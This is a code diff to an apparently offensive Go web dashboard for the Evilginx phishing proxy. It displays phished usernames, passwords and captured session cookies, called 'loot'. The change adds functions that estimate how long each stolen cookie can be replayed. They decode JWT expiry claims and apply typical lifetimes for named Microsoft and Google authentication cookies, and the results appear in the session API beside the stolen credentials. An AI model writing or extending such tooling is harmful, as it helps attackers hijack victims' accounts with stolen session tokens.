@@ -5,6 +5,7 @@ import (
 	"bytes"
 	"crypto/subtle"
 	_ "embed"
+	"encoding/base64"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -24,7 +25,7 @@ import (
 //go:embed index.html
 var indexHTML []byte
 
-const version = "1.2.0"
+const version = "1.3.0"
 
 // ---- Evilginx data model (matches kgretzky/evilginx2 database.Session) ----
 
@@ -67,9 +68,19 @@ type ExpCookie struct {
 	SameSite       string `json:"sameSite"`
 }
 
+func (s Session) capturedAt() int64 {
+	if s.UpdateTime > 0 {
+		return s.UpdateTime
+	}
+	if s.CreateTime > 0 {
+		return s.CreateTime
+	}
+	return time.Now().Unix()
+}
+
 func (s Session) exportCookies() []ExpCookie {
 	var out []ExpCookie
-	exp := time.Now().AddDate(1, 0, 0).Unix()
+	captured := s.capturedAt()
 	for domain, names := range s.CookieTokens {
 		for name, ct := range names {
 			if ct == nil {
@@ -94,6 +105,11 @@ func (s Session) exportCookies() []ExpCookie {
 					secure = true
 				}
 			}
+			exp, kind := cookieTTL(name, ct.Value, captured)
+			session := kind == "session"
+			if exp == 0 && !session {
+				exp = captured + 365*24*3600
+			}
 			out = append(out, ExpCookie{
 				Path:           path,
 				Domain:         dom,
@@ -103,7 +119,7 @@ func (s Session) exportCookies() []ExpCookie {
 				HttpOnly:       ct.HttpOnly,
 				HostOnly:       hostOnly,
 				Secure:         secure,
-				Session:        false,
+				Session:        session,
 				SameSite:       "no_restriction",
 			})
 		}
@@ -141,6 +157,54 @@ type lootInfo struct {
 	Token      string // strongest cookie name
 	Persistent bool
 	Tokens     []string
+	Expires    int64  // unix; 0 = browser session or unknown
+	TTLKind    string // parsed | typical | session | unknown
+}
+
+func jwtExp(val string) (int64, bool) {
+	parts := strings.Split(val, ".")
+	if len(parts) != 3 || !strings.HasPrefix(parts[0], "eyJ") {
+		return 0, false
+	}
+	payload, err := base64.RawURLEncoding.DecodeString(parts[1])
+	if err != nil {
+		payload, err = base64.URLEncoding.DecodeString(parts[1])
+		if err != nil {
+			return 0, false
+		}
+	}
+	var claims struct {
+		Exp int64 `json:"exp"`
+	}
+	if json.Unmarshal(payload, &claims) != nil || claims.Exp <= 0 {
+		return 0, false
+	}
+	return claims.Exp, true
+}
+
+// cookieTTL is the replay window of a captured auth cookie. Evilginx does not
+// store Max-Age, so we parse JWT exp when present and otherwise use the
+// documented typical lifetime from the moment of capture.
+func cookieTTL(name, value string, captured int64) (expires int64, kind string) {
+	if exp, ok := jwtExp(value); ok {
+		return exp, "parsed"
+	}
+	if captured <= 0 {
+		captured = time.Now().Unix()
+	}
+	day := int64(24 * 3600)
+	switch strings.ToLower(name) {
+	case "estsauthpersistent":
+		return captured + 90*day, "typical" // Entra KMSI default
+	case "__host-msaauthp", "rpssecauth", "mspauth":
+		return captured + 365*day, "typical" // MSA persistent ~1y
+	case "estsauth", "__host-msaauth", "signinstatescookie":
+		return 0, "session"
+	case "sid", "hsid", "ssid", "apisid", "sapisid", "lsid", "__secure-1psid", "__secure-3psid":
+		return captured + 2*365*day, "typical"
+	default:
+		return 0, "unknown"
+	}
 }
 
 // inspectLoot classifies a capture. "Valid" means a replayable IdP token is present,
@@ -149,6 +213,7 @@ func (s Session) inspectLoot() lootInfo {
 	var info lootInfo
 	best := 0
 	seen := map[string]bool{}
+	captured := s.capturedAt()
 	rankOf := func(name string) (rank int, kind string, persist bool) {
 		switch strings.ToLower(name) {
 		case "estsauthpersistent":
@@ -187,6 +252,9 @@ func (s Session) inspectLoot() lootInfo {
 				best = rank
 				info.Token = name
 				info.Kind = kind
+				exp, k := cookieTTL(name, ct.Value, captured)
+				info.Expires = exp
+				info.TTLKind = k
 			}
 		}
 	}
@@ -211,6 +279,8 @@ type apiSession struct {
 	Token      string   `json:"token"`
 	Persistent bool     `json:"persistent"`
 	Tokens     []string `json:"tokens"`
+	Expires    int64    `json:"expires"`
+	TTLKind    string   `json:"ttl_kind"`
 	Cookies    int      `json:"cookies"`
 	RemoteAddr string   `json:"remote_addr"`
 	Create     int64    `json:"create"`
@@ -954,6 +1024,7 @@ func dataHandler(dbPath string) http.HandlerFunc {
 			d.Sessions = append(d.Sessions, apiSession{
 				Id: s.Id, Phishlet: s.Phishlet, Username: s.Username, Password: s.Password,
 				Valid: loot.Valid, Kind: loot.Kind, Token: loot.Token, Persistent: loot.Persistent, Tokens: loot.Tokens,
+				Expires: loot.Expires, TTLKind: loot.TTLKind,
 				Cookies: s.cookieCount(), RemoteAddr: s.RemoteAddr,
 				Create: s.CreateTime, Update: s.UpdateTime, UserAgent: s.UserAgent,
 				Landing: s.LandingURL, SessionId: s.SessionId,
